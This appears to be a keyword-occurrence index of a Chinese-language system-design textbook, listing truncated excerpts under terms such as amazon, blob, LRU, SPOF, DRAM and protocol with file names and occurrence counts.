  c20_b02.md: ...* 每天 100 亿次重定向 * 每秒：10B / 86,400 ≈ 115,740 次重定向/秒 ≈ 116,000 RPS  **读写比：** 116,000 / 1,157 ≈ **100:1**——确认了约束。系统是巨量读多写少。  **...
  c20_b02.md: ...是带 `Location` header 的 301/302 HTTP 响应——大约 500 字节 * 116,000 RPS × 500 字节 = **58 MB/s 出站带宽**—— modest  **缓存估算：**  * 第 7 章的 Z...
  c20_b06.md: ...。   #### 第 5 层：扩展与可靠性  核心设计确定后，如何扩展以在 99.99% 可用性下处理 116,000 RPS？  **负载均衡器后的无状态重定向服务器：** 重定向服务无状态——所有状态在 Redis 和数据库。可按需运行任意多...
  c20_b12.md: ...并向 1000 万收件人大规模邮件发送。约 1000 万收件人同时打开邮件并点击链接。该流量模式与稳态 116,000 RPS 假设有何不同，你会如何设计？  **讨论：** 这是第 7 章惊群问题在 URL 级别的表现。单个短码在邮件发送触发点...
  c20_b12.md: ...章惊群问题在 URL 级别的表现。单个短码在邮件发送触发点击波时收到 1000 万同时请求。稳态假设的 116,000 RPS 分布到所有 URL，现在变成几分钟内一个 URL 1000 万请求。  **该流量模式特征：**  * 高度集中：所有...
  c20_b13.md: ...）直接从这些数字得出：Redis 缓存服务热数据集，防止读负载到达数据库。异步分析架构（第 8 章）把 116,000 RPS 的分析写路径与关键重定向路径解耦。水平扩展（第 11 章）使重定向服务可 trivial 扩展。数据库读副本（第 12...
  c21_b02.md: ...则带宽消耗乘以 10。 * **服务器负载：** 50 万（500,000）并发用户每秒轮询 = 聊天服务器 50 万 RPS，大多数返回空响应。对零用户价值而言这是巨大负载。  短轮询仅适用于更新频率极低的场景（例如每分钟查一次 job 状态）...
  c22_b13.md: ...秒轮询 `/feed/new-count`。500 万（5 million）并发用户时，约 10 万（100,000）RPS——但每个请求是一次 Redis GET（约 1ms），完全可行。相比之下，以 10 万 RPS 轮询完整 feed 组...
  c22_b13.md: ...0 万（100,000）RPS——但每个请求是一次 Redis GET（约 1ms），完全可行。相比之下，以 10 万 RPS 轮询完整 feed 组装，需要 100,000 × 20 次数据库 fetch/秒 = 200 万（2 million...

=== amazon (14 occurrences) ===
  c02_b03.md: ...nsistency）：** 写完成后，不同节点的读可能暂时返回不同值。但如果没有新的写，所有节点_最终_会收敛到相同值。Amazon 购物车、社交媒体 Feed 和 DNS 记录都是最终一致系统的例子。  在这两个极端之间还有许多中间模型（read-y...
  c04_b08.md: ...副本而从 50ms 变成 300ms，用户也会注意到（并离开）。 3. **许多真实系统对延迟敏感。** Google、Amazon 和 Netflix 都写过，页面加载时间增加 100ms 会显著降低用户参与度。对这些公司来说，ELC tradeof...
  c06_b01.md: ...e, Bigtable | | 图数据库（Graph Database） | 节点与边 | 关系遍历 | Neo4j, Amazon Neptune |  我们将详细审视每一种，聚焦它为何访问模式而设计、以及做出了哪些 tradeoff（权衡）。...
  c08_b04.md: ...闭（新增消费者无需改动）。   ### 8.5 Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设...
  c08_b05.md: ...味着必须仔细配置保留期——保留太久消耗存储；保留太短暂无法重放。  对更简单的用例（单个消费者从队列读取），托管服务如 Amazon SQS 或 Google Cloud Pub/Sub 通常是正确选择。Kafka 在你需要高吞吐、多个独立消费者组或事...
  c08_b16.md: ...× 86,400 秒/天 × 7 天 ≈ 1.2 TB Kafka 存储。3 倍复制下就是 3.6 TB。  对一个用 Amazon SQS 做更简单用例（后台邮件发送任务队列）的团队，SQS 在中等规模下成本几乎为零——消息消费即删除，任何时刻队列深...
  c10_b03.md: ...**你在哪里遇到块存储：**  * 服务器中的物理磁盘（SATA SSD、NVMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure...
  c10_b04.md: ...` 上传，用 `GET /bucket/key` 下载。没有目录层次——“类路径”的 key 只是字符串。  典型例子：Amazon S3（Simple Storage Service）。概念模型：       Bucket: socialsnap-m...
  c10_b18.md: ...析存储：**  这个工作负载属于列式 OLAP（Online Analytical Processing）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文...
  c14_b04.md: ...但可能返回陈旧数据）。  传统关系型数据库（PostgreSQL、MySQL）是 CP：它们宁愿拒绝读也不返回陈旧数据。Amazon DynamoDB 和 Apache Cassandra 是 AP：即使在分区期间也继续提供读，代价是可能返回陈旧数据。...
  c14_b06.md: ...钟——追踪因果关系  最后写入获胜（LWW）冲突解决很简单但危险：它会静默丢弃几乎同时发生的并发写。对很多应用不可接受。Amazon 的购物车 famously 用了更复杂的方法：不是丢弃冲突写，而是保留两者，让应用（或用户）解决冲突。  要知道两次写...
  c26_b07.md: ...### 26.7 Dynamo 论文——关键创新  Amazon 2007 年发表 Dynamo 论文，描述了支撑 Amazon 购物车等服务的内部键值存储。该论文引入或普及了本章大部...
  c26_b07.md: ...### 26.7 Dynamo 论文——关键创新  Amazon 2007 年发表 Dynamo 论文，描述了支撑 Amazon 购物车等服务的内部键值存储。该论文引入或普及了本章大部分概念。其关键创新：  1. **带虚拟节点的一致性哈希：**...
  c26_b12.md: ...#### 深入思考  **Q1.** Dynamo 论文写于 2007 年，描述 Amazon 购物车的系统。购物车要求加入购物车的商品永不丢失——即使不同设备上的并发用户在修改同一购物车。本章键值存储设计如何处理...

=== blob (14 occurrences) ===
  c03_b07.md: ...≈ 约 460 TB/年**  这是纯文字存储的 2000 倍增长！视频完全主导存储。SocialSnap 需要专门的 blob 存储方案（如 S3），而不是数据库存储。  **(b) 视频服务带宽：** 从 3.5 节可知，500 万 DAU 的...
  c03_b08.md: ...CDN 的话，一条病毒式传播的视频几分钟内几百万次观看就会立刻饱和单条连接。  **架构结论：** 视频存储立即接入 blob 存储；从一开始就加 CDN 分发视频。永远不要直接从应用服务器服务视频。  **Q3.** 一个音乐流媒体服务有 50...
  c10_b01.md: ...p 需要把文件返回给潜在成千上万的同时访问者。  文件放哪里？  天真的答案：存到 PostgreSQL 数据库，作为 blob（binary large object）列。这对几百个用户有效。对几百万则失败。头像照片不像用户记录——它们很大、访问...
  c10_b06.md: ...这对少量用户有效。大规模下多方面失败：  * PostgreSQL 的 B-tree 索引优化小值。在表中存 2 MB blob 会降低索引性能——页面巨大，缓冲池（RAM 缓存）被大 blob 填满，而不是索引页面和对查询性能重要的行数据。 *...
  c10_b06.md: ...的 B-tree 索引优化小值。在表中存 2 MB blob 会降低索引性能——页面巨大，缓冲池（RAM 缓存）被大 blob 填满，而不是索引页面和对查询性能重要的行数据。 * 每次用户资料查询都会加载整个 blob，即使查询只需要用户名。 *...
  c10_b06.md: ...缓冲池（RAM 缓存）被大 blob 填满，而不是索引页面和对查询性能重要的行数据。 * 每次用户资料查询都会加载整个 blob，即使查询只需要用户名。 * 向浏览器提供照片需要：从 PostgreSQL 读取 → 加载到应用服务器内存 → 流式传...
  c10_b10.md: ...* 顺序大读取（日志分析）→ 对象存储或 HDFS * 分层目录结构、多写入者 → 文件存储（NFS） * 大二进制 blob（图片、视频、文档）→ 对象存储  **第 2 步：大小特征是什么？**  * KB 到低 MB，数百万记录 → 关系型...
  c10_b10.md: ...D/月）vs 磁带（2,000 USD/月）  对 SocialSnap 头像照片：访问模式是“按 URL 读取二进制 blob”（对象存储模式），大小是 MB 级，50ms 延迟可接受（CDN 会提供更快缓存副本），持久性重要（用户照片消失会不满...
  c10_b11.md: ...元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平的 key-value 命名空间，每个对象都是不透明的 blob，通过 HTTP 访问（`PUT`/`GET`/`DELETE` by key）。没有目录层次（只有用 key 前缀模拟...
  c10_b19.md: ...经 CDN，只有 URL 存在 PostgreSQL 中。对象存储 URL 桥接了关系数据库的结构化世界与二进制媒体的 blob 世界。  **存储中的持久性** 来自复制和校验和。对象存储通过跨可用区（availability zone，保障可用...
  c12_b08.md: ...缓冲 负载均衡（第 9 章） | 分发流量；容错 | 需要无状态后端 | 多台应用服务器 对象存储（第 10 章） | blob 无限扩展（可扩展性） | 不可查询；最终一致性 | 文件、图片、视频 水平扩展（第 11 章） | 线性吞吐扩展 |...
  c23_b03.md: ...。  如何知道内容是否变化？我们存储上次爬取页面内容的哈希。重新爬取时比较哈希。若未变，跳过重新索引。这与第 10 章 blob 存储讨论中的内容寻址存储思想相同。   #### 作为侦探的爬虫  本书的 Thread C——侦探纪律——一直关于从...
  c24_b02.md: ...HLS 或 DASH 格式），列出所有可用质量级别及每个片段的 URL 5. **存储与分发：** 把所有编码片段存入 blob 存储（回忆第 10 章对象存储）并分发到 CDN 边缘节点  plain 语言：转码流水线是把一个原始视频变成多个可流...
  c24_b06.md: ...）：**  * 上传服务（分块、可续传上传）→ 队列 → 转码 worker（每视频片段极度并行）→ 编码片段写入分层 blob 存储 → 生成并存储清单  **分发路径（CDN 交付）：**  * 源对象存储 → 区域 CDN 缓存 → 边缘 C...

=== database (14 occurrences) ===
  c07_b04.md: ...n the cached value     3. If cache MISS:        - Query the database for the value        - Store the value in the cache with a...
  c07_b04.md: ...e to the caller   写入新值：       1. Write the new value to the database     2. Invalidate (delete) the old cached value — OR — upda...
  c07_b05.md: ...同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return success   **读取路径：...
  c07_b05.md: ...2. On miss (first access or cache restart): fetch from database   **收益：** 缓存从不过期。读取几乎总是命中缓存。  **代价：** 每次写入需要两个操作（数据库 + 缓存）。...
  c07_b05.md: ...-memory)     2. Mark the entry as "dirty" (pending flush to database)     3. Return success immediately     4. [Background proce...
  c07_b05.md: ...ediately     4. [Background process] Flush dirty entries to database at regular intervals   **收益：** 写入以缓存速度完成——毫秒级。如果一个 key 每秒更新...
  c07_b07.md: ...st)     Redis Cache         ↓ (on miss only)     PostgreSQL Database   **资料缓存：**       def get_user_profile(user_id):         ca...
  c07_b07.md: ...on.loads(cached)  # Cache hit          # Cache miss — query database         profile = db.query("SELECT * FROM users WHERE id =...
  c07_b07.md: ...f update_user_profile(user_id, new_bio):         # Write to database first         db.execute("UPDATE users SET bio = %s WHERE i...
  c16_b15.md: ...thy" | "degraded" | "unhealthy",       "checks": {         "database": {"status": "ok", "latency_ms": 2},         "redis": {"sta...
  c17_b06.md: ...ost Service: fetch_posts (148ms)             [55ms - 80ms]  Database: SELECT posts WHERE id IN (...) (25ms)             [85ms -...
  c17_b06.md: ...Service: fetch_authors (110ms)               [88ms - 190ms] Database: SELECT users WHERE id IN (...) (102ms)           [202ms -...
  c28_b12.md: ...licas** (Ch 12) | 读延迟更低 | 最终（复制 lag） | 读可用性更高 | 中——故障转移配置 **Database sharding** (Ch 12) | 写延迟更低（分布式写） | 分片内强；跨分片困难 | 高——分片故障影响 1...
  intro.md: ...端工程师，以及需要评估系统方案的技术经理。  **先修要求**：具备基本编程概念（写过函数、循环、条件语句）；大致了解 database（数据库）和 API 是什么。不需要分布式系统背景——本书从零讲起。  **学习时长**：28 章共 120–160 小...

=== lru (14 occurrences) ===
  c07_b06.md: ...#### LRU——最近最少使用  最常见的驱逐策略是 **LRU（Least Recently Used，最近最少使用）**。当缓存满...
  c07_b06.md: ...#### LRU——最近最少使用  最常见的驱逐策略是 **LRU（Least Recently Used，最近最少使用）**。当缓存满且需要添加新条目时，访问时间最久远的数据被驱逐。...
  c07_b06.md: ...*。当缓存满且需要添加新条目时，访问时间最久远的数据被驱逐。  直觉：如果你很久没访问某数据，你很快访问它的可能性也低。LRU 保留“热”数据——正在被活跃访问的数据——并驱逐“冷”数据。  **LRU 如何工作：** 内部上，LRU 缓存维护一...
  c07_b06.md: ...很久没访问某数据，你很快访问它的可能性也低。LRU 保留“热”数据——正在被活跃访问的数据——并驱逐“冷”数据。  **LRU 如何工作：** 内部上，LRU 缓存维护一个数据结构（通常是双向链表加哈希表）来跟踪访问顺序。每次访问 key，它就被...
  c07_b06.md: ...可能性也低。LRU 保留“热”数据——正在被活跃访问的数据——并驱逐“冷”数据。  **LRU 如何工作：** 内部上，LRU 缓存维护一个数据结构（通常是双向链表加哈希表）来跟踪访问顺序。每次访问 key，它就被移到“最近使用”端。“最近最少使...
  c07_b06.md: ...常是双向链表加哈希表）来跟踪访问顺序。每次访问 key，它就被移到“最近使用”端。“最近最少使用”端是驱逐候选。  **LRU 的代价：** 维护访问顺序结构给每次缓存操作增加开销。一种简化近似——LFU（Least Frequently Use...
  c07_b06.md: ...种简化近似——LFU（Least Frequently Used，最少 frequently 使用）、随机驱逐或“近似 LRU”——可以减少开销，代价是驱逐决策不那么最优。Redis 使用近似 LRU：采样一部分 key，在其中驱逐最近最少访问的...
  c07_b06.md: ...requently 使用）、随机驱逐或“近似 LRU”——可以减少开销，代价是驱逐决策不那么最优。Redis 使用近似 LRU：采样一部分 key，在其中驱逐最近最少访问的。   #### 其他驱逐策略  **LFU（Least Frequent...
  c07_b06.md: ...（Least Frequently Used，最少频繁使用）：** 驱逐总访问次数最少的 key。当热度随时间稳定时比 LRU 更好（上周流行且今天仍然流行的数据项应该保留；LRU 可能因为它在过去一小时内没被访问而驱逐它）。  **FIFO（F...
  c07_b06.md: ...使用）：** 驱逐总访问次数最少的 key。当热度随时间稳定时比 LRU 更好（上周流行且今天仍然流行的数据项应该保留；LRU 可能因为它在过去一小时内没被访问而驱逐它）。  **FIFO（First In, First Out，先进先出）：**...
  c07_b06.md: ...的 `BASE` 是 `TTL-based` 的拼写片段，不是 BASE 一致性模型。）  实践中，大多数生产缓存使用 LRU 并以 TTL 过期作为安全网：条目在缓存满时（LRU）或停留太久时（TTL）被驱逐，以先发生者为准。   ### 7....
  c07_b15.md: ...精确 recency 并不关键。足够短，用户在合理窗口内看到新帖；足够长，提供有意义的缓存保护。  **驱逐策略：** LRU。最近没加载 Feed 的用户（不活跃用户）缓存条目会被自然驱逐。每周只登录一次的用户没必要整周缓存其 Feed——到那...
  c07_b15.md: ...Feed 的用户（不活跃用户）缓存条目会被自然驱逐。每周只登录一次的用户没必要整周缓存其 Feed——到那时完全陈旧了。LRU 自然保留最近活跃用户的 Feed。  **失效逻辑（两层方案）：**  _第一层（Tier 1）——基于 TTL 的过...
  c07_b17.md: ...确 TTL 取决于数据变化频率和可接受的陈旧程度。  **驱逐策略**（LRU、LFU、TTL）决定缓存满时什么被移除。LRU 是最常见默认。  **惊群** 是缓存过期导致数据库查询同步激增的故障模式。抖动、加锁和后台刷新是缓解手段。  Soc...

=== protocol (14 occurrences) ===
  c09_b09.md: ...务间通信  gRPC 是 Google 开发的高性能 RPC（Remote Procedure Call）框架。它使用 Protocol Buffers（protocol buffer 协议，Protobuf）做序列化——一种二进制协议格式，比 JSON...
  c09_b09.md: ...—调试需要工具 * 浏览器支持有限（gRPC 需要 HTTP/2 特性，浏览器仅通过 gRPC-Web 部分支持） * Protocol Buffers schema 管理需要工具 * 对简单外部 API 杀鸡用牛刀  **何时选 gRPC：** 内部服务...
  c13_b13.md: ...拆成微服务，发现十二人团队现在把一半时间花在运维开销和服务间协调上，而不是构建产品。  **Q2.** gRPC 使用 Protocol Buffers（protocol buffer 协议，二进制序列化格式），而 REST 使用 JSON（文本格式）。一...
  c13_b13.md: ...性能考量？  **讨论：** 这位同事的说法对小负载和低流量大致正确。一次传输几百字节、每秒几百次的请求，JSON 和 Protocol Buffers 在端到端延迟上差别可忽略。  在特定场景下这个说法会崩：  **高容量服务间通信：** 如果 User...
  c13_b13.md: ...每次都需要序列化和反序列化中等复杂度的 JSON 对象（比如 2-5 KB），JSON 解析消耗的 CPU 时间会累积。Protocol Buffers 对同等数据的解析速度是 JSON 的 3-10 倍。在这个规模上，差异是可测量的。  **大负载：**...
  c13_b13.md: ...，差异是可测量的。  **大负载：** JSON 把数字表示成字符串（`"count": 12345` 占 12 字节；Protocol Buffers 编码同样整数只需 1-2 字节）。对包含数千条记录的响应，这种差异会放大。100 KB 的 JSON...
  c13_b13.md: ...fers 编码同样整数只需 1-2 字节）。对包含数千条记录的响应，这种差异会放大。100 KB 的 JSON 响应用 Protocol Buffers 可能只要 30 KB——影响带宽和反序列化时间。  **流场景：** gRPC 支持单条 HTTP/2...
  c13_b14.md: ...Protocol Buffers（protocol buffer 协议）真正的优势主要不是性能，而是**契约强制（contract en...
  c13_b14.md: ...一致。用 JSON REST API 时，客户端和服务器很容易悄悄分叉（服务器重命名字段，客户端仍发旧名，被静默忽略）。Protocol Buffers 让这种不匹配变成编译时或 schema 校验错误。   ### 本章总结  微服务把单体拆分成独立部署...
  c26_b05.md: ...群状态的单一节点）是单点故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点...
  c26_b05.md: ...用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T 秒从集群中随机选一...
  c26_b05.md: ...群状态的单一节点）是单点故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点...
  c26_b05.md: ...用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T 秒从集群中随机选一...
  c28_b14.md: ...ropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本） | 中 **Gossip protocol** (Ch 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低 **Fan-ou...

=== spof (14 occurrences) ===
  c11_b16.md: ...的可用性论据。  教训：依赖乘法是真实担忧，但它被每一层的冗余所抵消。“更多组件”意味着“更多故障点”只在该组件本身是 SPOF 时成立。让每个组件都冗余，链式的高可用组件乘积就超过单台服务器能达到的水平。...
  c11_b17.md: ...这个问题探问无状态要求是否真正得到满足，还是只是把有状态问题往下推了一层。  Redis 本身必须冗余运行，以避免成为 SPOF。标准配置是 **Redis Sentinel** 或 **Redis Cluster**：一个 Redis 主节点处理...
  c16_b03.md: ...#### 定义：单点故障  **单点故障（single point of failure，SPOF）** 是任何故障会导致整个系统失败的组件。如果移除该组件系统就宕，它就是 SPOF。  plain 语言：如果你某个东...
  c16_b03.md: ...point of failure，SPOF）** 是任何故障会导致整个系统失败的组件。如果移除该组件系统就宕，它就是 SPOF。  plain 语言：如果你某个东西只有一份，它失败整个系统就失败。一个数据库、一台服务器、一条网络路径——在添加冗余...
  c16_b03.md: ...lain 语言：如果你某个东西只有一份，它失败整个系统就失败。一个数据库、一台服务器、一条网络路径——在添加冗余前都是 SPOF。  SocialSnap 早期架构（第 1 章）中，每个组件都是 SPOF：一台笔记本、一个数据库、一个进程。随着架构...
  c16_b03.md: ...台服务器、一条网络路径——在添加冗余前都是 SPOF。  SocialSnap 早期架构（第 1 章）中，每个组件都是 SPOF：一台笔记本、一个数据库、一个进程。随着架构演进，SPOF 被逐步消除：  * 负载均衡器后的多台应用服务器（第 11...
  c16_b03.md: ...SocialSnap 早期架构（第 1 章）中，每个组件都是 SPOF：一台笔记本、一个数据库、一个进程。随着架构演进，SPOF 被逐步消除：  * 负载均衡器后的多台应用服务器（第 11 章）消除了应用服务器 SPOF。 * 带自动故障转移的读副...
  c16_b03.md: ...库、一个进程。随着架构演进，SPOF 被逐步消除：  * 负载均衡器后的多台应用服务器（第 11 章）消除了应用服务器 SPOF。 * 带自动故障转移的读副本（第 12 章）减少了数据库 SPOF（主库失败时提升副本为主库）。 * Redis Se...
  c16_b03.md: ...后的多台应用服务器（第 11 章）消除了应用服务器 SPOF。 * 带自动故障转移的读副本（第 12 章）减少了数据库 SPOF（主库失败时提升副本为主库）。 * Redis Sentinel 或 Redis Cluster（第 11 章）消除了...
  c16_b03.md: ...主库）。 * Redis Sentinel 或 Redis Cluster（第 11 章）消除了 Redis 会话存储 SPOF。 * 云基础设施的多个可用区消除了数据中心 SPOF。  消除 SPOF 是高可用性（high availabilit...
  c16_b03.md: ...is Cluster（第 11 章）消除了 Redis 会话存储 SPOF。 * 云基础设施的多个可用区消除了数据中心 SPOF。  消除 SPOF 是高可用性（high availability）的第一步。但仅冗余不够——冗余组件必须独立失败。如...
  c16_b03.md: ...（第 11 章）消除了 Redis 会话存储 SPOF。 * 云基础设施的多个可用区消除了数据中心 SPOF。  消除 SPOF 是高可用性（high availability）的第一步。但仅冗余不够——冗余组件必须独立失败。如果两台服务器共享同一...
  c28_b12.md: ...储中 **Vertical scaling** (Ch 11) | 更低延迟（更快硬件） | N/A | 低——单机器 SPOF | 低 **Read replicas** (Ch 12) | 读延迟更低 | 最终（复制 lag） | 读可用性更高...
  c28_b12.md: ...nkerd 运营负担 **API gateway** (Ch 13, 9) | 小开销 | N/A | 中——未集群则 SPOF | 中 **CQRS** (Ch 8, 14) | 读延迟更低（优化读模型） | 最终（读模型可能落后写模型） | 高...

=== error (14 occurrences) ===
  c17_b04.md: ...需要详细了解发生了什么。这就是日志的角色。  考虑请求失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45...
  c17_b04.md: ..."timestamp": "2024-01-15T14:47:23.441Z",       "level": "ERROR",       "service": "profile-service",       "event": "profi...
  c17_b04.md: ..."upstream": "redis",       "latency_ms": 30012,       "error": "connection timeout"     }   结构化日志机器可读。你可以查询它：“显示最近 10 分钟...
  c17_b04.md: ...必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Servic...
  c17_b05.md: ...注意的事件：“缓存未命中率超过 50%——可能缓存踩踏”、“用户 Y 触发限流器”。WARN 不是失败，但值得调查。  ERROR 日志记录失败：“数据库查询失败”、“下游服务返回 500”、“通知重试 3 次后仍失败”。每条 ERROR 都应可行动...
  c17_b05.md: ...得调查。  ERROR 日志记录失败：“数据库查询失败”、“下游服务返回 500”、“通知重试 3 次后仍失败”。每条 ERROR 都应可行动——如果一个错误经常发生却没人处理，它可能被误分类或配置错误。  FATAL 日志记录进程无法恢复并即将退出...
  c17_b05.md: ...请求量是否增加？”（查看请求率指标。）结果：请求量正常。  **假设 3：** 依赖失败。检查：“是否有引用外部服务的 ERROR 日志？”（查询过去 30 分钟 ERROR 日志，过滤 `upstream` 字段。）结果：多条日志显示 `"upst...
  c17_b05.md: ...请求量正常。  **假设 3：** 依赖失败。检查：“是否有引用外部服务的 ERROR 日志？”（查询过去 30 分钟 ERROR 日志，过滤 `upstream` 字段。）结果：多条日志显示 `"upstream": "redis", "error...
  c17_b05.md: ...ERROR 日志，过滤 `upstream` 字段。）结果：多条日志显示 `"upstream": "redis", "error": "connection timeout"`。  每条日志都是一条线索。好的调查者系统化地阅读线索，而不是淹没其中。...
  c17_b09.md: ...操作的**延迟直方图**显示 99 百分位超过 5 秒。另一条告警触发。 * 应用服务器的**结构化日志**开始积累 `ERROR` 条目，`"upstream": "redis", "error": "connection timeout"`。 *...
  c17_b09.md: ...触发。 * 应用服务器的**结构化日志**开始积累 `ERROR` 条目，`"upstream": "redis", "error": "connection timeout"`。 * **分布式追踪**显示所有长耗时请求都有 Redis 超时的 s...
  c17_b09.md: ...但应用没有返回 503 错误。  工程师查询日志：“显示过去 5 分钟 `upstream == 'redis'` 的 ERROR 日志。”他们看到 847 条错误。查看 Redis 仪表盘，发现有一个 Redis 节点——shard 2 的主库——...
  c17_b11.md: ...d, user_id, channel, latency_ms}` * `notification_failed` — ERROR：`{trace_id, notification_id, user_id, channel, error, retry...
  c17_b11.md: ...led` — ERROR：`{trace_id, notification_id, user_id, channel, error, retry_count}` * `notification_dead_lettered` — WARN：`{noti...

=== dram (13 occurrences) ===
  c03_b06.md: ...flash translation layer，FTL）带来查找开销。即使没有旋转盘片，读取闪存单元的电学过程也比读取 DRAM 单元慢。  **Q2.** 一家初创公司声称他们的服务能处理“1000 万用户”。解释为什么这句话在缺少上下文时对架构...
  c10_b02.md: ...物理。  在电路中移动电子（内存或 CPU 缓存）比在旋转磁盘上移动磁头快。没有移动部件的 SSD 比旋转硬盘快，但比 DRAM 慢。速度层级对应成本层级。  这是从最快最贵到最慢最便宜的存储层级：  **第 1 级：CPU 寄存器和缓存（L1/L...
  c10_b02.md: ...部分） * 容量：千字节（L1）到兆字节（L3） * 存放内容：CPU 当前正在执行的活动变量和指令  **第 2 级：DRAM（内存）**  * 速度：约 100 纳秒（0.1 微秒） * 成本：约 5–10 USD/GB * 容量：每台服务器...
  c10_b02.md: ...据存放位置时，你总是在这个 tradeoff（权衡）中航行。   #### 10,000 倍差距  需要记住的一个数字：DRAM 访问与 SSD 访问的差距约为 1,000 倍。DRAM 访问与 HDD 访问的差距约为 100,000 倍。Redi...
  c10_b02.md: ...。   #### 10,000 倍差距  需要记住的一个数字：DRAM 访问与 SSD 访问的差距约为 1,000 倍。DRAM 访问与 HDD 访问的差距约为 100,000 倍。Redis 以微秒级服务数据；PostgreSQL 在机械盘上需要...
  c10_b02.md: ...把热数据从第 5 级（HDD）移到第 2 级（DRAM，通过 Redis），访问延迟可降低 100,000 倍。  但 DRAM 每 GB 成本比 HDD 高 100–500 倍。你不能把所有东西存在 DRAM 中——必须选择哪些数据值得这个溢价。...
  c10_b02.md: ...迟可降低 100,000 倍。  但 DRAM 每 GB 成本比 HDD 高 100–500 倍。你不能把所有东西存在 DRAM 中——必须选择哪些数据值得这个溢价。...
  c10_b10.md: ...→ 对象存储 * 超大文件，分析工作负载 → HDFS  **第 3 步：需要多低延迟？**  * 亚毫秒级（缓存）→ DRAM（Redis、Memcached） * 个位数毫秒级（事务查询）→ NVMe 关系型数据库 * 几十毫秒可接受（媒体文件...
  c10_b10.md: ...ite-behind 缓存（设计上不持久）  **第 5 步：成本约束是什么？**  * 100 GB 热用户数据 → DRAM（500 USD/月）vs NVMe SSD（10 USD/月）vs 对象存储（2 USD/月） * 1 PB 冷归档数...
  c10_b10.md: ...储层级  存储类型 | 延迟 | 一致性 | 可用性 | 运维复杂度   |---|---|---|---|---   DRAM (Redis) | ↓↓ 亚毫秒 | varies | ↑（如复制） | ↑（Redis 集群运维）   NVMe S...
  c10_b10.md: ...tradeoff（权衡）：更快存储每字节更贵。了解这个 tradeoff（权衡）后，你可以设计分层存储架构——热数据放 DRAM，温数据放 SSD，冷数据放对象存储，归档数据放磁带/Glacier。需要足够快的数据就足够贵；可以慢的数据就便宜。...
  c10_b11.md: ...种存储系统，并描述每种最适合的一种工作负载。从访问模式、延迟要求和成本角度解释你的理由。  **答案：**  **基于 DRAM 的缓存（Redis）：**  最佳工作负载：Web 应用会话数据。每次认证请求都访问会话（高读取频率），数据小（每个会...
  c10_b19.md: ...### 本章总结  “数据住在哪里？”这个问题原来是系统设计中最有影响的架构决策之一。从纳秒级 DRAM 到毫秒级对象存储，再到分钟级归档的存储层级，反映了一个基本物理约束：速度和成本成反比。  **块存储**是基础——操作...

=== integer (13 occurrences) ===
  c05_b06.md: ...password_hash VARCHAR(255) NOT NULL,         follower_count INTEGER DEFAULT 0,         following_count INTEGER DEFAULT 0,...
  c05_b06.md: ...follower_count INTEGER DEFAULT 0,         following_count INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()...
  c05_b06.md: ...id          SERIAL PRIMARY KEY,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         content...
  c05_b06.md: ...ADE,         content     TEXT NOT NULL,         like_count  INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()...
  c05_b06.md: ...);          CREATE TABLE follows (         follower_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         followed_id...
  c05_b06.md: ...REFERENCES users(id) ON DELETE CASCADE,         followed_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at...
  c05_b06.md: ...d)     );          CREATE TABLE likes (         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         post_id...
  c05_b06.md: ...REFERENCES users(id) ON DELETE CASCADE,         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         created_at...
  c05_b10.md: ...hema 扩展：**      CREATE TABLE mentions (         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         user_id...
  c05_b10.md: ...REFERENCES posts(id) ON DELETE CASCADE,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at...
  c06_b12.md: ...id              SERIAL PRIMARY KEY,         patient_id      INTEGER REFERENCES patients(id),         drug_name       VARCHAR(20...
  c06_b12.md: ...id              SERIAL PRIMARY KEY,         patient_id      INTEGER REFERENCES patients(id),         note_type       VARCHAR(50...
  c06_b12.md: ...note_type       VARCHAR(50),         author_id       INTEGER REFERENCES users(id),         created_at      TIMESTAMP DEF...

=== hashtag (13 occurrences) ===
  c06_b10.md: ...的原生地理空间支持是为此专门构建的。  **Q2.**（联系第 5 章反规范化讨论）SocialSnap 想增加“热门 hashtag”功能：展示过去 24 小时使用最多的 10 个 hashtag。帖子在创建时被打上 hashtag。在两种数据库中勾勒...
  c06_b10.md: ...5 章反规范化讨论）SocialSnap 想增加“热门 hashtag”功能：展示过去 24 小时使用最多的 10 个 hashtag。帖子在创建时被打上 hashtag。在两种数据库中勾勒数据模型——关系型数据库和键值存储（Redis）——并比较 tr...
  c06_b10.md: ...ap 想增加“热门 hashtag”功能：展示过去 24 小时使用最多的 10 个 hashtag。帖子在创建时被打上 hashtag。在两种数据库中勾勒数据模型——关系型数据库和键值存储（Redis）——并比较 tradeoff（权衡）。  提示...
